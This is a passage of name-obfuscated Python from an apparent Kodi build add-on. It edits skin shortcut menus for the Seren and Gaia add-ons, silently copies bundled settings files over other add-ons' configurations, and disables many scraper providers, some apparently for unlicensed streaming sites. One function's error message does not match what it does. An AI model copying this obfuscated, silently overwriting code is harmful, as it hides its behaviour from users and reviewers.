		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1205
    with open (OOO000O000O0O0OOO ,'w')as O0OOOOOOOO00OOO00 :#line:1208
      O0OOOOOOOO00OOO00 .write (OOO00000000000OOO )#line:1209
    OOO000O000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1213
    with open (OOO000O000O0O0OOO ,'r')as O0OOOOOOOO00OOO00 :#line:1214
      OOO00000000000OOO =O0OOOOOOOO00OOO00 .read ()#line:1215
    OOO00000000000OOO =OOO00000000000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1233
    with open (OOO000O000O0O0OOO ,'w')as O0OOOOOOOO00OOO00 :#line:1236
      O0OOOOOOOO00OOO00 .write (OOO00000000000OOO )#line:1237
    OOO000O000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1241
    with open (OOO000O000O0O0OOO ,'r')as O0OOOOOOOO00OOO00 :#line:1242
      OOO00000000000OOO =O0OOOOOOOO00OOO00 .read ()#line:1243
    OOO00000000000OOO =OOO00000000000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1261
    with open (OOO000O000O0O0OOO ,'w')as O0OOOOOOOO00OOO00 :#line:1264
      O0OOOOOOOO00OOO00 .write (OOO00000000000OOO )#line:1265
    OOO000O000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1269
    with open (OOO000O000O0O0OOO ,'r')as O0OOOOOOOO00OOO00 :#line:1270
      OOO00000000000OOO =O0OOOOOOOO00OOO00 .read ()#line:1271
    OOO00000000000OOO =OOO00000000000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1289
    with open (OOO000O000O0O0OOO ,'w')as O0OOOOOOOO00OOO00 :#line:1292
      O0OOOOOOOO00OOO00 .write (OOO00000000000OOO )#line:1293
    OOO000O000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1296
    with open (OOO000O000O0O0OOO ,'r')as O0OOOOOOOO00OOO00 :#line:1297
      OOO00000000000OOO =O0OOOOOOOO00OOO00 .read ()#line:1298
    OOO00000000000OOO =OOO00000000000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1316
    with open (OOO000O000O0O0OOO ,'w')as O0OOOOOOOO00OOO00 :#line:1319
      O0OOOOOOOO00OOO00 .write (OOO00000000000OOO )#line:1320
    OOO000O000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1322
    with open (OOO000O000O0O0OOO ,'r')as O0OOOOOOOO00OOO00 :#line:1323
      OOO00000000000OOO =O0OOOOOOOO00OOO00 .read ()#line:1324
    OOO00000000000OOO =OOO00000000000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1342
    with open (OOO000O000O0O0OOO ,'w')as O0OOOOOOOO00OOO00 :#line:1345
      O0OOOOOOOO00OOO00 .write (OOO00000000000OOO )#line:1346
    OOO000O000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1348
    with open (OOO000O000O0O0OOO ,'r')as O0OOOOOOOO00OOO00 :#line:1349
      OOO00000000000OOO =O0OOOOOOOO00OOO00 .read ()#line:1350
    OOO00000000000OOO =OOO00000000000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1368
    with open (OOO000O000O0O0OOO ,'w')as O0OOOOOOOO00OOO00 :#line:1371
      O0OOOOOOOO00OOO00 .write (OOO00000000000OOO )#line:1372
    OOO000O000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1375
    with open (OOO000O000O0O0OOO ,'r')as O0OOOOOOOO00OOO00 :#line:1376
      OOO00000000000OOO =O0OOOOOOOO00OOO00 .read ()#line:1377
    OOO00000000000OOO =OOO00000000000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1395
    with open (OOO000O000O0O0OOO ,'w')as O0OOOOOOOO00OOO00 :#line:1398
      O0OOOOOOOO00OOO00 .write (OOO00000000000OOO )#line:1399
def rdbuildinstallON ():#line:1402
    try :#line:1404
       O000O0OOO0O0O00O0 =ADDONPATH +"/resources/rd/victory.xml"#line:1405
       OOOO0O00OOO0O0O0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1406
       copyfile (O000O0OOO0O0O00O0 ,OOOO0O00OOO0O0O0O )#line:1408
       O000O0OOO0O0O00O0 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1410
       OOOO0O00OOO0O0O0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1411
       copyfile (O000O0OOO0O0O00O0 ,OOOO0O00OOO0O0O0O )#line:1413
       O000O0OOO0O0O00O0 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1415
       OOOO0O00OOO0O0O0O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1416
       copyfile (O000O0OOO0O0O00O0 ,OOOO0O00OOO0O0O0O )#line:1418
       O000O0OOO0O0O00O0 =ADDONPATH +"/resources/rd/Splash.png"#line:1421
       OOOO0O00OOO0O0O0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1422
       copyfile (O000O0OOO0O0O00O0 ,OOOO0O00OOO0O0O0O )#line:1424
    except :#line:1426
       pass #line:1427
def rdbuild ():#line:1437
	OOO0O0O00O0000O0O =(ADDON .getSetting ("auto_rd"))#line:1438
	if OOO0O0O00O0000O0O =='true':#line:1439
		O0O00OO00O00OOO0O =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1440
		O0O00OO00O00OOO0O .setSetting ('all_t','0')#line:1441
		O0O00OO00O00OOO0O .setSetting ('rd_menu_enable','false')#line:1442
		O0O00OO00O00OOO0O .setSetting ('magnet_bay','false')#line:1443
		O0O00OO00O00OOO0O .setSetting ('magnet_extra','false')#line:1444
		O0O00OO00O00OOO0O .setSetting ('rd_only','false')#line:1445
		O0O00OO00O00OOO0O .setSetting ('ftp','false')#line:1447
		O0O00OO00O00OOO0O .setSetting ('fp','false')#line:1448
		O0O00OO00O00OOO0O .setSetting ('filter_fp','false')#line:1449
		O0O00OO00O00OOO0O .setSetting ('fp_size_en','false')#line:1450
		O0O00OO00O00OOO0O .setSetting ('afdah','false')#line:1451
		O0O00OO00O00OOO0O .setSetting ('ap2s','false')#line:1452
		O0O00OO00O00OOO0O .setSetting ('cin','false')#line:1453
		O0O00OO00O00OOO0O .setSetting ('clv','false')#line:1454
		O0O00OO00O00OOO0O .setSetting ('cmv','false')#line:1455
		O0O00OO00O00OOO0O .setSetting ('dl20','false')#line:1456
		O0O00OO00O00OOO0O .setSetting ('esc','false')#line:1457
		O0O00OO00O00OOO0O .setSetting ('extra','false')#line:1458
		O0O00OO00O00OOO0O .setSetting ('film','false')#line:1459
		O0O00OO00O00OOO0O .setSetting ('fre','false')#line:1460
		O0O00OO00O00OOO0O .setSetting ('fxy','false')#line:1461
		O0O00OO00O00OOO0O .setSetting ('genv','false')#line:1462
		O0O00OO00O00OOO0O .setSetting ('getgo','false')#line:1463
		O0O00OO00O00OOO0O .setSetting ('gold','false')#line:1464
		O0O00OO00O00OOO0O .setSetting ('gona','false')#line:1465
		O0O00OO00O00OOO0O .setSetting ('hdmm','false')#line:1466
		O0O00OO00O00OOO0O .setSetting ('hdt','false')#line:1467
		O0O00OO00O00OOO0O .setSetting ('icy','false')#line:1468
		O0O00OO00O00OOO0O .setSetting ('ind','false')#line:1469
		O0O00OO00O00OOO0O .setSetting ('iwi','false')#line:1470
		O0O00OO00O00OOO0O .setSetting ('jen_free','false')#line:1471
		O0O00OO00O00OOO0O .setSetting ('kiss','false')#line:1472
		O0O00OO00O00OOO0O .setSetting ('lavin','false')#line:1473
		O0O00OO00O00OOO0O .setSetting ('los','false')#line:1474
		O0O00OO00O00OOO0O .setSetting ('m4u','false')#line:1475
		O0O00OO00O00OOO0O .setSetting ('mesh','false')#line:1476
		O0O00OO00O00OOO0O .setSetting ('mf','false')#line:1477
		O0O00OO00O00OOO0O .setSetting ('mkvc','false')#line:1478
		O0O00OO00O00OOO0O .setSetting ('mjy','false')#line:1479
		O0O00OO00O00OOO0O .setSetting ('hdonline','false')#line:1480
		O0O00OO00O00OOO0O .setSetting ('moviex','false')#line:1481
		O0O00OO00O00OOO0O .setSetting ('mpr','false')#line:1482
		O0O00OO00O00OOO0O .setSetting ('mvg','false')#line:1483
		O0O00OO00O00OOO0O .setSetting ('mvl','false')#line:1484
		O0O00OO00O00OOO0O .setSetting ('mvs','false')#line:1485
		O0O00OO00O00OOO0O .setSetting ('myeg','false')#line:1486
		O0O00OO00O00OOO0O .setSetting ('ninja','false')#line:1487
		O0O00OO00O00OOO0O .setSetting ('odb','false')#line:1488
		O0O00OO00O00OOO0O .setSetting ('ophd','false')#line:1489
		O0O00OO00O00OOO0O .setSetting ('pks','false')#line:1490
		O0O00OO00O00OOO0O .setSetting ('prf','false')#line:1491
		O0O00OO00O00OOO0O .setSetting ('put18','false')#line:1492
		O0O00OO00O00OOO0O .setSetting ('req','false')#line:1493
		O0O00OO00O00OOO0O .setSetting ('rftv','false')#line:1494
		O0O00OO00O00OOO0O .setSetting ('rltv','false')#line:1495
		O0O00OO00O00OOO0O .setSetting ('sc','false')#line:1496
		O0O00OO00O00OOO0O .setSetting ('seehd','false')#line:1497
		O0O00OO00O00OOO0O .setSetting ('showbox','false')#line:1498
		O0O00OO00O00OOO0O .setSetting ('shuid','false')#line:1499
		O0O00OO00O00OOO0O .setSetting ('sil_gh','false')#line:1500
		O0O00OO00O00OOO0O .setSetting ('spv','false')#line:1501
		O0O00OO00O00OOO0O .setSetting ('subs','false')#line:1502
		O0O00OO00O00OOO0O .setSetting ('tvs','false')#line:1503
		O0O00OO00O00OOO0O .setSetting ('tw','false')#line:1504
		O0O00OO00O00OOO0O .setSetting ('upto','false')#line:1505
		O0O00OO00O00OOO0O .setSetting ('vel','false')#line:1506
		O0O00OO00O00OOO0O .setSetting ('vex','false')#line:1507
		O0O00OO00O00OOO0O .setSetting ('vidc','false')#line:1508
		O0O00OO00O00OOO0O .setSetting ('w4hd','false')#line:1509
		O0O00OO00O00OOO0O .setSetting ('wav','false')#line:1510
		O0O00OO00O00OOO0O .setSetting ('wf','false')#line:1511
		O0O00OO00O00OOO0O .setSetting ('wse','false')#line:1512
		O0O00OO00O00OOO0O .setSetting ('wss','false')#line:1513
		O0O00OO00O00OOO0O .setSetting ('wsse','false')#line:1514
		O0O00OO00O00OOO0O =xbmcaddon .Addon ('plugin.video.speedmax')#line:1515
		O0O00OO00O00OOO0O .setSetting ('debrid.only','true')#line:1516
		O0O00OO00O00OOO0O .setSetting ('hosts.captcha','false')#line:1517
		O0O00OO00O00OOO0O =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1518
		O0O00OO00O00OOO0O .setSetting ('provider.123moviehd','false')#line:1519
		O0O00OO00O00OOO0O .setSetting ('provider.300mbdownload','false')#line:1520
		O0O00OO00O00OOO0O .setSetting ('provider.alltube','false')#line:1521
		O0O00OO00O00OOO0O .setSetting ('provider.allucde','false')#line:1522
		O0O00OO00O00OOO0O .setSetting ('provider.animebase','false')#line:1523
		O0O00OO00O00OOO0O .setSetting ('provider.animeloads','false')#line:1524
		O0O00OO00O00OOO0O .setSetting ('provider.animetoon','false')#line:1525
		O0O00OO00O00OOO0O .setSetting ('provider.bnwmovies','false')#line:1526
		O0O00OO00O00OOO0O .setSetting ('provider.boxfilm','false')#line:1527
		O0O00OO00O00OOO0O .setSetting ('provider.bs','false')#line:1528
		O0O00OO00O00OOO0O .setSetting ('provider.cartoonhd','false')#line:1529
		O0O00OO00O00OOO0O .setSetting ('provider.cdahd','false')#line:1530
		O0O00OO00O00OOO0O .setSetting ('provider.cdax','false')#line:1531
		O0O00OO00O00OOO0O .setSetting ('provider.cine','false')#line:1532
		O0O00OO00O00OOO0O .setSetting ('provider.cinenator','false')#line:1533
		O0O00OO00O00OOO0O .setSetting ('provider.cmovieshdbz','false')#line:1534
		O0O00OO00O00OOO0O .setSetting ('provider.coolmoviezone','false')#line:1535
		O0O00OO00O00OOO0O .setSetting ('provider.ddl','false')#line:1536
		O0O00OO00O00OOO0O .setSetting ('provider.deepmovie','false')#line:1537
		O0O00OO00O00OOO0O .setSetting ('provider.ekinomaniak','false')#line:1538
		O0O00OO00O00OOO0O .setSetting ('provider.ekinotv','false')#line:1539
		O0O00OO00O00OOO0O .setSetting ('provider.filiser','false')#line:1540
		O0O00OO00O00OOO0O .setSetting ('provider.filmpalast','false')#line:1541
		O0O00OO00O00OOO0O .setSetting ('provider.filmwebbooster','false')#line:1542
		O0O00OO00O00OOO0O .setSetting ('provider.filmxy','false')#line:1543
		O0O00OO00O00OOO0O .setSetting ('provider.fmovies','false')#line:1544
		O0O00OO00O00OOO0O .setSetting ('provider.foxx','false')#line:1545
		O0O00OO00O00OOO0O .setSetting ('provider.freefmovies','false')#line:1546
		O0O00OO00O00OOO0O .setSetting ('provider.freeputlocker','false')#line:1547
		O0O00OO00O00OOO0O .setSetting ('provider.furk','false')#line:1548
		O0O00OO00O00OOO0O .setSetting ('provider.gamatotv','false')#line:1549
		O0O00OO00O00OOO0O .setSetting ('provider.gogoanime','false')#line:1550
		O0O00OO00O00OOO0O .setSetting ('provider.gowatchseries','false')#line:1551
		O0O00OO00O00OOO0O .setSetting ('provider.hackimdb','false')#line:1552
		O0O00OO00O00OOO0O .setSetting ('provider.hdfilme','false')#line:1553
		O0O00OO00O00OOO0O .setSetting ('provider.hdmto','false')#line:1554
		O0O00OO00O00OOO0O .setSetting ('provider.hdpopcorns','false')#line:1555
		O0O00OO00O00OOO0O .setSetting ('provider.hdstreams','false')#line:1556
		O0O00OO00O00OOO0O .setSetting ('provider.horrorkino','false')#line:1558
		O0O00OO00O00OOO0O .setSetting ('provider.iitv','false')#line:1559
		O0O00OO00O00OOO0O .setSetting ('provider.iload','false')#line:1560
		O0O00OO00O00OOO0O .setSetting ('provider.iwaatch','false')#line:1561
		O0O00OO00O00OOO0O .setSetting ('provider.kinodogs','false')#line:1562
		O0O00OO00O00OOO0O .setSetting ('provider.kinoking','false')#line:1563
		O0O00OO00O00OOO0O .setSetting ('provider.kinow','false')#line:1564
		O0O00OO00O00OOO0O .setSetting ('provider.kinox','false')#line:1565
		O0O00OO00O00OOO0O .setSetting ('provider.lichtspielhaus','false')#line:1566
		O0O00OO00O00OOO0O .setSetting ('provider.liomenoi','false')#line:1567
		O0O00OO00O00OOO0O .setSetting ('provider.magnetdl','false')#line:1570
		O0O00OO00O00OOO0O .setSetting ('provider.megapelistv','false')#line:1571
		O0O00OO00O00OOO0O .setSetting ('provider.movie2k-ac','false')#line:1572
		O0O00OO00O00OOO0O .setSetting ('provider.movie2k-ag','false')#line:1573
		O0O00OO00O00OOO0O .setSetting ('provider.movie2z','false')#line:1574
		O0O00OO00O00OOO0O .setSetting ('provider.movie4k','false')#line:1575
		O0O00OO00O00OOO0O .setSetting ('provider.movie4kis','false')#line:1576
		O0O00OO00O00OOO0O .setSetting ('provider.movieneo','false')#line:1577
		O0O00OO00O00OOO0O .setSetting ('provider.moviesever','false')#line:1578
		O0O00OO00O00OOO0O .setSetting ('provider.movietown','false')#line:1579
		O0O00OO00O00OOO0O .setSetting ('provider.mvrls','false')#line:1581
		O0O00OO00O00OOO0O .setSetting ('provider.netzkino','false')#line:1582
		O0O00OO00O00OOO0O .setSetting ('provider.odb','false')#line:1583
		O0O00OO00O00OOO0O .setSetting ('provider.openkatalog','false')#line:1584
		O0O00OO00O00OOO0O .setSetting ('provider.ororo','false')#line:1585
		O0O00OO00O00OOO0O .setSetting ('provider.paczamy','false')#line:1586
		O0O00OO00O00OOO0O .setSetting ('provider.peliculasdk','false')#line:1587
		O0O00OO00O00OOO0O .setSetting ('provider.pelisplustv','false')#line:1588
		O0O00OO00O00OOO0O .setSetting ('provider.pepecine','false')#line:1589
		O0O00OO00O00OOO0O .setSetting ('provider.primewire','false')#line:1590
		O0O00OO00O00OOO0O .setSetting ('provider.projectfreetv','false')#line:1591
		O0O00OO00O00OOO0O .setSetting ('provider.proxer','false')#line:1592
		O0O00OO00O00OOO0O .setSetting ('provider.pureanime','false')#line:1593
		O0O00OO00O00OOO0O .setSetting ('provider.putlocker','false')#line:1594
		O0O00OO00O00OOO0O .setSetting ('provider.putlockerfree','false')#line:1595
		O0O00OO00O00OOO0O .setSetting ('provider.reddit','false')#line:1596
		O0O00OO00O00OOO0O .setSetting ('provider.cartoonwire','false')#line:1597
		O0O00OO00O00OOO0O .setSetting ('provider.seehd','false')#line:1598
		O0O00OO00O00OOO0O .setSetting ('provider.segos','false')#line:1599
		O0O00OO00O00OOO0O .setSetting ('provider.serienstream','false')#line:1600
		O0O00OO00O00OOO0O .setSetting ('provider.series9','false')#line:1601
		O0O00OO00O00OOO0O .setSetting ('provider.seriesever','false')#line:1602
		O0O00OO00O00OOO0O .setSetting ('provider.seriesonline','false')#line:1603
		O0O00OO00O00OOO0O .setSetting ('provider.seriespapaya','false')#line:1604
		O0O00OO00O00OOO0O .setSetting ('provider.sezonlukdizi','false')#line:1605
		O0O00OO00O00OOO0O .setSetting ('provider.solarmovie','false')#line:1606
		O0O00OO00O00OOO0O .setSetting ('provider.solarmoviez','false')#line:1607
		O0O00OO00O00OOO0O .setSetting ('provider.stream-to','false')#line:1608
		O0O00OO00O00OOO0O .setSetting ('provider.streamdream','false')#line:1609
		O0O00OO00O00OOO0O .setSetting ('provider.streamflix','false')#line:1610
		O0O00OO00O00OOO0O .setSetting ('provider.streamit','false')#line:1611
		O0O00OO00O00OOO0O .setSetting ('provider.swatchseries','false')#line:1612
		O0O00OO00O00OOO0O .setSetting ('provider.szukajkatv','false')#line:1613
		O0O00OO00O00OOO0O .setSetting ('provider.tainiesonline','false')#line:1614
		O0O00OO00O00OOO0O .setSetting ('provider.tainiomania','false')#line:1615
		O0O00OO00O00OOO0O .setSetting ('provider.tata','false')#line:1618
		O0O00OO00O00OOO0O .setSetting ('provider.trt','false')#line:1619
		O0O00OO00O00OOO0O .setSetting ('provider.tvbox','false')#line:1620
		O0O00OO00O00OOO0O .setSetting ('provider.ultrahd','false')#line:1621
		O0O00OO00O00OOO0O .setSetting ('provider.video4k','false')#line:1622
		O0O00OO00O00OOO0O .setSetting ('provider.vidics','false')#line:1623
		O0O00OO00O00OOO0O .setSetting ('provider.view4u','false')#line:1624
		O0O00OO00O00OOO0O .setSetting ('provider.watchseries','false')#line:1625
		O0O00OO00O00OOO0O .setSetting ('provider.xrysoi','false')#line:1626
		O0O00OO00O00OOO0O .setSetting ('provider.library','false')#line:1627
def fixfont ():#line:1630
	O0O0000OO0OOO0OOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1631
	OOO00O00O00OOOOO0 =json .loads (O0O0000OO0OOO0OOO );#line:1633
	OOOOO00OO0OO00OOO =OOO00O00O00OOOOO0 ["result"]["settings"]#line:1634
	OOO0OOOOO0O0O0000 =[O0O00OO00O00000OO for O0O00OO00O00000OO in OOOOO00OO0OO00OOO if O0O00OO00O00000OO ["id"]=="audiooutput.audiodevice"][0 ]#line:1636
	OO0O00OOOOO0000OO =OOO0OOOOO0O0O0000 ["options"];#line:1637
	O0OOOOO0O000OOOOO =OOO0OOOOO0O0O0000 ["value"];#line:1638
	OOO00O00000O0OO00 =[O0OO0000000000O00 for (O0OO0000000000O00 ,O0OOO0O0OO0O0O0OO )in enumerate (OO0O00OOOOO0000OO )if O0OOO0O0OO0O0O0OO ["value"]==O0OOOOO0O000OOOOO ][0 ];#line:1640
	OOO0O00OO000000O0 =(OOO00O00000O0OO00 +1 )%len (OO0O00OOOOO0000OO )#line:1642
	O0OO000OO00OOO000 =OO0O00OOOOO0000OO [OOO0O00OO000000O0 ]["value"]#line:1644
	O0000000O0O0O0OO0 =OO0O00OOOOO0000OO [OOO0O00OO000000O0 ]["label"]#line:1645
	O000000OO0OO0OOO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1647
	try :#line:1649
		O000O0OOO0OO0O0OO =json .loads (O000000OO0OO0OOO0 );#line:1650
		if O000O0OOO0OO0O0OO ["result"]!=True :#line:1652
			raise Exception #line:1653
	except :#line:1654
		sys .stderr .write ("Error switching audio output device")#line:1655
		raise Exception #line:1656
def parseDOM2 (O00O00OOO00000O00 ,name =u"",attrs ={},ret =False ):#line:1657
	if isinstance (O00O00OOO00000O00 ,str ):#line:1660
		try :#line:1661
			O00O00OOO00000O00 =[O00O00OOO00000O00 .decode ("utf-8")]#line:1662
		except :#line:1663
			O00O00OOO00000O00 =[O00O00OOO00000O00 ]#line:1664
	elif isinstance (O00O00OOO00000O00 ,unicode ):#line:1665
		O00O00OOO00000O00 =[O00O00OOO00000O00 ]#line:1666
	elif not isinstance (O00O00OOO00000O00 ,list ):#line:1667
		return u""#line:1668
	if not name .strip ():#line:1670
		return u""#line:1671
	O0OO0O0O0O0O0O00O =[]#line:1673
	for O0OO00OO000OO0OOO in O00O00OOO00000O00 :#line:1674
		O00000OO000O00000 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0OO00OO000OO0OOO )#line:1675
		for O0OO0OOOOO0OO0000 in O00000OO000O00000 :#line:1676
			O0OO00OO000OO0OOO =O0OO00OO000OO0OOO .replace (O0OO0OOOOO0OO0000 ,O0OO0OOOOO0OO0000 .replace ("\n"," "))#line:1677
		O0O0OO0O0OOOOOO00 =[]#line:1679
		for OOO00OOOOOOO0OOO0 in attrs :#line:1680
			O0OO00000OO0O00O0 =re .compile ('(<'+name +'[^>]*?(?:'+OOO00OOOOOOO0OOO0 +'=[\'"]'+attrs [OOO00OOOOOOO0OOO0 ]+'[\'"].*?>))',re .M |re .S ).findall (O0OO00OO000OO0OOO )#line:1681
			if len (O0OO00000OO0O00O0 )==0 and attrs [OOO00OOOOOOO0OOO0 ].find (" ")==-1 :#line:1682
				O0OO00000OO0O00O0 =re .compile ('(<'+name +'[^>]*?(?:'+OOO00OOOOOOO0OOO0 +'='+attrs [OOO00OOOOOOO0OOO0 ]+'.*?>))',re .M |re .S ).findall (O0OO00OO000OO0OOO )#line:1683
			if len (O0O0OO0O0OOOOOO00 )==0 :#line:1685
				O0O0OO0O0OOOOOO00 =O0OO00000OO0O00O0 #line:1686
				O0OO00000OO0O00O0 =[]#line:1687
			else :#line:1688
				OOOO0OO0O00000000 =range (len (O0O0OO0O0OOOOOO00 ))#line:1689
				OOOO0OO0O00000000 .reverse ()#line:1690
				for OOOOOO00O0OO0000O in OOOO0OO0O00000000 :#line:1691
					if not O0O0OO0O0OOOOOO00 [OOOOOO00O0OO0000O ]in O0OO00000OO0O00O0 :#line:1692
						del (O0O0OO0O0OOOOOO00 [OOOOOO00O0OO0000O ])#line:1693
		if len (O0O0OO0O0OOOOOO00 )==0 and attrs =={}:#line:1695
			O0O0OO0O0OOOOOO00 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0OO00OO000OO0OOO )#line:1696
			if len (O0O0OO0O0OOOOOO00 )==0 :#line:1697
				O0O0OO0O0OOOOOO00 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0OO00OO000OO0OOO )#line:1698
		if isinstance (ret ,str ):#line:1700
			O0OO00000OO0O00O0 =[]#line:1701
			for O0OO0OOOOO0OO0000 in O0O0OO0O0OOOOOO00 :#line:1702
				O0O0O00OO0OO0OO00 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0OO0OOOOO0OO0000 )#line:1703
				if len (O0O0O00OO0OO0OO00 )==0 :#line:1704
					O0O0O00OO0OO0OO00 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0OO0OOOOO0OO0000 )#line:1705
				for OOOOO00OOO0O0O0O0 in O0O0O00OO0OO0OO00 :#line:1706
					O00O00O0OO0OO00O0 =OOOOO00OOO0O0O0O0 [0 ]#line:1707
					if O00O00O0OO0OO00O0 in "'\"":#line:1708
						if OOOOO00OOO0O0O0O0 .find ('='+O00O00O0OO0OO00O0 ,OOOOO00OOO0O0O0O0 .find (O00O00O0OO0OO00O0 ,1 ))>-1 :#line:1709
							OOOOO00OOO0O0O0O0 =OOOOO00OOO0O0O0O0 [:OOOOO00OOO0O0O0O0 .find ('='+O00O00O0OO0OO00O0 ,OOOOO00OOO0O0O0O0 .find (O00O00O0OO0OO00O0 ,1 ))]#line:1710
						if OOOOO00OOO0O0O0O0 .rfind (O00O00O0OO0OO00O0 ,1 )>-1 :#line:1712
